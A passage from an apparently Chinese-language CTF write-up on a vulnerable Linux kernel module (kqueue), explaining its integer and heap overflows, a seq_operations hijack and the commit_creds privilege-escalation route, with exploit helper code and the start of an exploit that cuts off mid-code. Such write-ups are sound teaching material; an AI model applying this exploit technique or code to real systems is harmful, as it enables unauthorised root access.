+<code>__builtin_umulll_overflow</code>函数和<code>__builtin_saddll_overflow</code>函数是gcc中的内置函数，其作用是运算并检查是否溢出。在gcc中有一系列这样的函数，详情请见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43919932/article/details/123666702?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165769979316780357217968%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165769979316780357217968&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123666702-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=__builtin_umulll_overflow&amp;spm=1018.2226.3001.4187">资料</a>。实际上函数的功能可以通过其名字得知。如<code>__builtin_umulll_overflow</code>中<code>umulll</code>的第一个u指的是无符号整数运算，mul是乘法，后面的ll是整数类型（长整型）。类似的，<code>__builtin_saddll_overflow</code>指的是有符号（s）长整型（ll）加法（add）。由此可知每一次添加kqueue，其第一个kmalloc分配的大小应该为<code>sizeof(queue) + sizeof(queue_entry) * max_entries</code>，其中max_entries代表这个队列可容纳的最大的元素个数。结构体<code>queue</code>中保存队列的基本信息，结构体<code>queue_entry</code>保存队列中一个元素的信息，每一个元素都是一个字符串，字符串的长度由传入的请求<code>request.data_size</code>决定，即一个队列中保存所有字符串的内存块大小相等。<br />
+另外注意如果请求分配n个queue_entry，这个函数实际上会给你分配出n+1个entry的空间，也就是调用<code>__builtin_saddll_overflow</code>函数时乘以<code>request.max_entries+1</code>。<code>__builtin_saddll_overflow</code>函数虽然会检查乘法是否有溢出，但不能检查<code>request.max_entries+1</code>这个加法会不会溢出。如果传入的<code>request.max_entries=0xFFFFFFFF</code>，加1变成0，乘法绝对不会溢出，但这个值0xFFFFFFFF会保存到<code>queue.max_entries</code>之中，有潜在的隐患。这个时候后面的申请entries的循环一次都不会执行，即一共只分配了0x20大小（注意结构体中元素的对齐）的空间用于存放queue而没有分配空间用于queue_entry。</p>
+<p>delete_kqueue函数即将空间释放，内容清零。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">delete_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后是edit_kqueue函数，即在第queue_idx个队列中的第entry_idx个元素中写入内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">edit_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the kqueue exists at that idx */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue entry */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the kqueue entry memory */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for the existence of the kqueue entry */</span></span><br><span class="line">    exists = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="built_in">queue</span>-&gt;max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* If kqueue entry found , do the necessary */</span></span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">            <span class="keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class="line">                validate(<span class="built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">                exists = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx==<span class="number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(<span class="built_in">queue</span>-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!exists)</span><br><span class="line">        <span class="keyword">return</span> NOT_EXISTS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这是save函数，其功能是将一个队列中的所有字符串在另外一个内存块中保存。注意这里每一个字符串拷贝的大小为request.data_size，前面对request.data_size的比较仅仅是比较其是否大于整个queue的大小。因此这里存在溢出漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">save_kqueue_entries</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="type">char</span> *new_queue = validate((<span class="type">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>综上，我们大概理解了这个驱动的功能，其中包含了一个整型溢出漏洞和一个缓冲区溢出漏洞。接下来介绍这个漏洞应该如何利用。</p>
+<p>本题的漏洞利用方式需要借助一个结构体：<code>seq_operations</code>，大小为0x20（与queue相同），包含4个指针：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单介绍一下这个结构体是干什么用的。这是序列文件必备的结构体，相当于一个迭代器，能够循环输出某些内容，常用于导出数据与记录，便于管理大数据文件。当一个定义了这个结构体的LKM被打开（如使用cat命令）时，内核就会创建这样的一个数据结构，并首先调用start函数指针。由于这个结构体的大小为0x20，因此其很有可能与上面的queue分配到相距不远的地方。如果能够控制这里的start指针，就能够控制内核执行流。本题打开的序列文件为/proc/self/stat。</p>
+<p>下面是这题的qemu启动脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br></pre></td></tr></table></figure>
+<p>可见其开启了kaslr保护，但没有SMAP/SMEP和kpti，因此如果能够获取到内核地址的基址，就能够找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>两个函数的地址。至于如何找到内核基址，后面介绍。</p>
+<p>现在，我们可以着手编写程序的交互部分了，一些通用的函数如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ROOTFS_HEAP_OVERFLOW_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOTFS_HEAP_OVERFLOW_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ROOTFS_HEAP_OVERFLOW_H</span></span></span><br></pre></td></tr></table></figure>
+<p>另外注意，本题中的所有检查实际上都是虚张声势，因为err函数并没有让程序强制退出，仅仅只是输出了一行错误信息就允许继续运行下去了。因此利用的思路可以尽情放开。</p>
+<p>刚刚打开qemu时，笔者想用调试的方法查看LKM的运行过程。实际上，如果能够读取到<code>/sys/module/kqueue/.text</code>、<code>/sys/module/kqueue/.data</code>、<code>/sys/module/kqueue/.bss</code>的值或使用<code>lsmod</code>命令，就能够获取到LKM相应段的基址，但本题中权限不允许。这就比较麻烦了，需要首先将断点下在用户态程序中，然后一步一步跟踪到内核找到相应函数的调用位置。笔者尝试过通过搜索字符串等方式获取基址，但都失败了。这也是笔者认为这道题最为恶心的一个部分了。<s>（毕竟耗了一个晚上）</s></p>
+<p>不过本题还好，不是太需要用到调试，下面的调试仅为演示。</p>
+<p>测试代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap_overflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        error_log(<span class="string">&quot;Cannot open /dev/kqueue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> create_req = &#123;</span><br><span class="line">            .max_entries = <span class="number">0xFFFFFFFF</span>,</span><br><span class="line">            .data_size = <span class="number">0x20</span> * <span class="number">8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span 